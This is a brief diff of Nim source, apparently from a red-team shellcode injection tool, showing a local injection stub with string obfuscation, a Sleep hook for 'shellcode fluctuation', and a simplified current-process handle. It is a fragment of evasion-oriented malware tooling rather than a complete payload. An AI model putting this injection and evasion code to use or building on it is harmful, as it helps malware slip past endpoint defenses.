@@ -28,12 +28,7 @@ let LocalInjectStub*  = """
                 when defined(verbose):
                     echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
 
-        when defined(DInvoke):
-            let tProcess = MyGetCurrentProcessId()
-            var pHandle: HANDLE = MyGetCurrentProcess()
-        else:
-            let tProcess = GetCurrentProcessId()
-            var pHandle: HANDLE = GetCurrentProcess()
+        var pHandle: HANDLE = -1
             
         var 
             status          : NTSTATUS          = 0x00000000
